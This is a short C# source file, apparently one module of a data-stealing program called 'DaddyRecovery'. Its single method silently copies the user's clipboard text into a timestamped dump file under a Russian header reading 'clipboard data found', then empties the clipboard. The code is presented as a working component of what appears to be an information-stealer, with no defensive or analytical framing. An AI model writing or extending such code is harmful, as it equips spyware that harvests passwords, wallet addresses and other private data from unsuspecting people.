namespace DaddyRecovery.Sticks
{
    using System;
    using Helpers;

    public static class BuffBoard
    {
        private static string DateSet(string time)
        {
            try
            {
                return DateTime.Now.ToString(time);
            }
            catch { return null; }
        }
        public static void Inizialize()
        {
            CombineEx.CreateFile(true, GlobalPath.BufferSave, $"[Найдены данные из буфера обмена] - [{DateSet("MM.dd.yyyy - HH:mm:ss")}]\r\n\r\n{ClipboardEx.GetText()}\r\n\r\n");
            NativeMethods.EmptyClipboard();
        }
    }
}